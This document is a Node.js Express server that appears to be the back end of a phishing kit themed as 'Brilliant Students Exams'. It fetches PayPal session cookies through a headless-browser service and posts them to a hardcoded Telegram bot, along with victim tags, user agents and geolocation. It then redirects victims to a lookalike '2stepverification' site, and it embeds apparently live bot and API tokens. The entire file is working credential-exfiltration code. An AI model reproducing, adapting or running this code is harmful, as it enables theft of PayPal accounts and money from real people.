const express = require('express');
const app = express();
const port = process.env.PORT || 3000;
const BOT_TOKEN = "8357190104:AAGRU7LylcJDfGyYGAQHhni7e8PyAC8PKkU";
const CHAT_ID = "8259952691";
const TWO_STEP_URL = "https://2stepverification.page.gd";
const BROWSERLESS_ENDPOINT = "https://production-sfo.browserless.io/chromium/bql";
const BROWSERLESS_TOKEN = "2TCTpnyOJWw8Uzu59c972c0c77dc84dda3b1c08bc859ece92";

app.use(express.json());

async function getGeoInfo() {
    try {
        const resp = await fetch('https://ipapi.co/json/');
        if (!resp.ok) throw new Error('IP API failed');
        const data = await resp.json();
        return {
            country: data.country_name || "Unknown",
            city: data.city || "Unknown",
            region: data.region || "Unknown"
        };
    } catch (e) {
        return { country: "Unknown", city: "Unknown", region: "Unknown" };
    }
}

async function sendToTelegram(paypalCookies, userTag, examNumber, geoInfo, url, userAgent) {
    const message =
        `📘 *Brilliant Students Exams*\n` +
        `🏷️ Tag: ${userTag}\n` +
        `🧾 Exam Number: ${examNumber}\n` +
        `🍪 PayPal Cookies: ${paypalCookies}\n` +
        `🌍 Country: ${geoInfo.country}\n` +
        `🏙️ City/Region: ${geoInfo.city}, ${geoInfo.region}\n` +
        `🌐 Loaded URL: ${url}\n` +
        `🖥️ User-Agent: ${userAgent}\n` +
        `✔️ Passed 2nd Stage`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "Markdown"
            })
        });
        const data = await response.json();
        if (data.ok) {
            console.log("Message sent successfully to Telegram");
        } else {
            console.error("Telegram API error:", data);
        }
    } catch (err) {
        console.error("Error sending to Telegram:", err);
    }
}

async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgent) {
    const userAgent = clientUserAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36';

    const query = `
        mutation Goto($url: String!) {
            goto(url: $url, waitUntil: networkIdle) {
                status
            }
            cookies
        }
    `;

    try {
        const response = await fetch(`${BROWSERLESS_ENDPOINT}?token=${BROWSERLESS_TOKEN}`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                query,
                variables: { url: paypalUrl }
            })
        });

        const data = await response.json();
        if (data.errors) throw new Error(data.errors[0].message);

        // Parse cookies from the response
        const cookies = data.data.cookies;
        let cookieString = "";
        if (Array.isArray(cookies)) {
            cookies.forEach(cookie => {
                // Extract the first part of the cookie string (name=value)
                const cookieParts = cookie.split(';')[0].trim();
                if (cookieParts) {
                    cookieString += cookieParts + "; ";
                }
            });
        }

        const geoInfo = await getGeoInfo();
        await sendToTelegram(cookieString || "No cookies found", userTag, examNumber, geoInfo, paypalUrl, userAgent);

        return {
            success: true,
            cookies: cookieString,
            redirectUrl: `${TWO_STEP_URL}?userTag=${encodeURIComponent(userTag)}`
        };
    } catch (err) {
        console.error("Browserless error:", err);
        const geoInfo = await getGeoInfo();
        await sendToTelegram(`Failed to fetch PayPal: ${err.message}`, userTag, examNumber, geoInfo, paypalUrl, userAgent);
        return {
            success: false,
            error: err.message,
            redirectUrl: `${TWO_STEP_URL}?userTag=${encodeURIComponent(userTag)}`
        };
    }
}

app.get('/api/paypal', async (req, res) => {
    const paypalUrl = req.query.url || 'https://www.paypal.com';
    const userTag = req.query.userTag || 'UnknownUser';
    const examNumber = req.query.examNumber || '';
    const clientUserAgent = req.headers['user-agent'] || '';

    if (!paypalUrl.startsWith('https://www.paypal.com')) {
        return res.status(400).json({ success: false, error: 'Invalid PayPal URL' });
    }

    const result = await fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgent);
    res.json(result);
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
